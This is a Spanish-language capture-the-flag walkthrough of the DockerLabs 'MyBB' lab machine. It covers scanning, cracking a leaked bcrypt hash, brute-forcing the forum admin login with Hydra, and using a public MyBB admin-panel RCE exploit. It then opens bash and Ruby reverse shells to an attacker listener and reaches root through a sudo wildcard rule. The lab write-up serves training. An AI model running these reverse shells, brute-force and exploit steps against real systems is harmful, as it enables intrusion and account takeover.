# MyBB DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip mybb.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh mybb.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 10:21 EST
Nmap scan report for 5eEk3r.dl (172.17.0.2)
Host is up (0.000053s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: MyBB
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

Si entramos en la pagina vemos una pagina normal que a simple vista no oculta gran cosa, pero si seguimos investigando un poco mas veremos lo siguiente en el codigo si lo inspeccionamos:

```html
<li class="nav-item">
  <a class="nav-link" href="http://panel.mybb.dl"> Forums </a>
</li>
```

Vemos que nos muestra un dominio al que se esta conectando, por lo que lo añadiremos a nuestro archivo `hosts`:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           panel.mybb.dl
```

Lo guardamos y nos conectamos con dicho dominio.

```
URL = http://panel.mybb.dl/
```

Vemos una pagina con un `software` llamado `MyBB`, si nos vamos a `MemberList` veremos que esta solamente el usuario `Administrador` por lo que tendremos que intentar obtener sus credenciales para entrar en el panel de `admin` que es lo que nos puede interesar, vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://panel.mybb.dl/ -w <WORDLIST> -x html,php,txt -t 100 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://panel.mybb.dl/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://panel.mybb.dl/admin/]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/announcements.php    (Status: 200) [Size: 10326]
/archive              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/archive/]
/attachment.php       (Status: 200) [Size: 10328]
/backups              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/backups/]
/cache                (Status: 301) [Size: 314] [--> http://panel.mybb.dl/cache/]
/calendar.php         (Status: 200) [Size: 27286]
/captcha.php          (Status: 200) [Size: 0]
/contact.php          (Status: 200) [Size: 12695]
/css.php              (Status: 200) [Size: 0]
/editpost.php         (Status: 200) [Size: 11097]
/forumdisplay.php     (Status: 200) [Size: 10542]
/global.php           (Status: 200) [Size: 98]
/htaccess.txt         (Status: 200) [Size: 3088]
/images               (Status: 301) [Size: 315] [--> http://panel.mybb.dl/images/]
/inc                  (Status: 301) [Size: 312] [--> http://panel.mybb.dl/inc/]
/index.php            (Status: 200) [Size: 13761]
/install              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/install/]
/javascript           (Status: 301) [Size: 319] [--> http://panel.mybb.dl/javascript/]
/jscripts             (Status: 301) [Size: 317] [--> http://panel.mybb.dl/jscripts/]
/memberlist.php       (Status: 200) [Size: 18803]
/member.php           (Status: 302) [Size: 0] [--> index.php]
/misc.php             (Status: 200) [Size: 0]
/modcp.php            (Status: 200) [Size: 11210]
/moderation.php       (Status: 200) [Size: 11090]
/newreply.php         (Status: 200) [Size: 10324]
/newthread.php        (Status: 200) [Size: 10301]
/online.php           (Status: 200) [Size: 11278]
/polls.php            (Status: 200) [Size: 0]
/portal.php           (Status: 200) [Size: 13640]
/printthread.php      (Status: 200) [Size: 10324]
/private.php          (Status: 200) [Size: 11211]
/reputation.php       (Status: 200) [Size: 10343]
/report.php           (Status: 200) [Size: 11097]
/rss.php              (Status: 302) [Size: 0] [--> syndication.php]
/search.php           (Status: 200) [Size: 14972]
/server-status        (Status: 403) [Size: 278]
/showthread.php       (Status: 200) [Size: 10562]
/stats.php            (Status: 200) [Size: 10463]
/task.php             (Status: 200) [Size: 43]
/syndication.php      (Status: 200) [Size: 429]
/uploads              (Status: 301) [Size: 316] [--> http://panel.mybb.dl/uploads/]
/usercp.php           (Status: 200) [Size: 11332]
/xmlhttp.php          (Status: 200) [Size: 0]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesantes, pero entre ellas vemos una llamada `/backups` esto lo sabemos por que si nos vamos al reporsitorio oficial del `Software` y vemos la estructura por dentro:

URL = [GitHub MyBB](https://github.com/mybb/mybb)

Vemos que sigue la misma que nos descubrio `Gobuster` pero el `backups` no esta, por lo que eso esta creado por el usuario y tiene buena pinta.

Si nos metemos en `Backups` veremos un archivo llamado `data` que contendra lo siguiente:

```
2024-06-16 12:00:00,INFO,Connection established from IP 192.168.1.10
2024-06-16 12:05:23,ERROR,Failed login attempt from IP 192.168.1.12
2024-06-16 12:10:45,INFO,User 'john' logged in
2024-06-16 12:15:47,INFO,Query executed: SELECT * FROM users WHERE id=1
2024-06-16 12:20:00,WARN,Slow query execution: 5 seconds
2024-06-16 12:25:13,INFO,Query executed: INSERT INTO logs (message) VALUES ('test')
2024-06-16 12:30:05,INFO,User 'alice' logged out
2024-06-16 12:35:33,INFO,User 'alice' attempted login with password '$2y$10$OwtjLEqBf9BFDtK8sSzJ5u.gR.tKYfYNmcWqIzQBbkv.pTgKX.pPi'
2024-06-16 12:40:00,ERROR,Database connection lost
2024-06-16 12:45:12,INFO,Database connection reestablished
2024-06-16 12:50:23,INFO,Query executed: UPDATE users SET last_login='2024-06-16' WHERE username='admin'
2024-06-16 12:55:44,ERROR,Permission denied for user 'guest' on database 'main'
2024-06-16 13:00:05,INFO,User 'jane' logged in
...............................<RESTO_CODIGO>......................................
```

Vemos que son como unos `logs` y el unico usuario que tiene una contraseña expuesta es la del usuario `alice` que vemos que esta codificada, por lo que intentaremos `crackearla` de la siguiente forma:

## John The Ripper

> hash

```
$2y$10$OwtjLEqBf9BFDtK8sSzJ5u.gR.tKYfYNmcWqIzQBbkv.pTgKX.pPi
```

Ahora lo haremos con `john`:

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tinkerbell       (?)     
1g 0:00:00:00 DONE (2025-01-26 10:31) 4.166g/s 300.0p/s 300.0c/s 300.0C/s 123456..666666
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que nos ha `crackeado` la contraseña correctamente, pero esto no nos servira para el `Software` de `MyBB` lo mas seguro es que sea del usuario dentro del sistema, vamos a lanzar fuerza bruta contra el login del `Software` con el usuario `admin`.

## Hydra

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt panel.mybb.dl http-post-form "/member.php:quick_username=^USER^&quick_password=^PASS^=login:The username and password combination you entered is invalid."
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-26 10:47:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://panel.mybb.dl:80/member.php:quick_username=^USER^&quick_password=^PASS^=login:The username and password combination you entered is invalid.
[80][http-post-form] host: panel.mybb.dl   login: admin   password: monkey
[80][http-post-form] host: panel.mybb.dl   login: admin   password: password
[80][http-post-form] host: panel.mybb.dl   login: admin   password: iloveyou
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345678
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 123456
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 1234567
[80][http-post-form] host: panel.mybb.dl   login: admin   password: daniel
[80][http-post-form] host: panel.mybb.dl   login: admin   password: babygirl
[80][http-post-form] host: panel.mybb.dl   login: admin   password: jessica
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 123456789
[80][http-post-form] host: panel.mybb.dl   login: admin   password: princess
[80][http-post-form] host: panel.mybb.dl   login: admin   password: rockyou
[80][http-post-form] host: panel.mybb.dl   login: admin   password: abc123
[80][http-post-form] host: panel.mybb.dl   login: admin   password: nicole
[80][http-post-form] host: panel.mybb.dl   login: admin   password: lovely
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-26 10:47:05
```

Nos aparecen varios falsos positivos, pero el que nos interesa sera la siguiente contraseña:

```
admin:babygirl
```

Por lo que nos logearemos con ella y veremos que estamos dentro como el usuario `admin`.

## Escalate user www-data

Si vemos si este `software` tiene alguna vulnerabilidad veremos el siguiente repositorio en el que podremos aprovechar un `RCE` que tiene este `software`:

URL = [Exploit RCE MyBB GitHub](https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE/blob/main/exploit.py)

Nos copiaremos el codigo y lo pegaremos dentro de un archivo que queramos en mi caso lo llame `exploit.py` y lo ejecutaremos lo de la siguiente forma:

```shell
python3 exploit.py http://panel.mybb.dl admin babygirl
```

Info:

```
[*] Logging into http://panel.mybb.dl/admin/ as admin
[*] Template saved!
[*] Testing code exec...
[*] Shell is working
[*] Special commands: exit (quit), remove (removes backdoor), config (prints mybb config), dump (dumps user table)
Enter Command> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MariaDB Server,,,:/nonexistent:/bin/false
alice:x:1001:1001:,,,:/home/alice:/bin/bash

Enter Command>
```

Vemos que nos funciona, hemos obtenido el `passwd` de la maquina victima, por lo que nos vamos hacer una `reverse shell` enviando el siguiente comando:

```
Enter Command> bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
```

Pero antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y cuando ejecutemos el anterior comando si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 51396
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@63d5012215ff:/var/www/mybb$
```

Por lo que vemos ha funcionado, por lo que vamos a sanitizar la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user alice

Si probamos a meter la contraseña que encontramos anteriormente para el usuario `alice` veremos que funciona.

```shell
su alice
```

Metemos como contraseña `tinkerbell` y veremos que estamos dentro como dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for alice on 63d5012215ff:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User alice may run the following commands on 63d5012215ff:
    (ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb
```

Vemos que podemos ejecutar cualquier script que tenga de extension `.rb` como el usuario `root` por lo que haremos lo siguiente:

```shell
cd /tmp
```

Ahora dentro de esta carpeta crearemos el siguiente archivo:

> script.rb

```rb
ruby -rsocket -e '
  spawn(
    "bash",
    [:in, :out, :err] => TCPSocket.new("<IP>", <PORT>)
  )
'
```

Lo guardamos y ahora lo ejecutaremos de la siguiente forma.

Pero antes de ejecutarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si lo ejecutaremos de la siguiente forma:

```shell
echo "ruby -rsocket -e'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"<IP>\",<PORT>))'" > /home/alice/scripts/script.rb
chmod 777 script.rb
sudo /home/alice/scripts/script.rb
```

Si volvemos donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 58564
whoami
root
```

Veremos que ya somos `root`, por lo que habremos terminado la maquina.
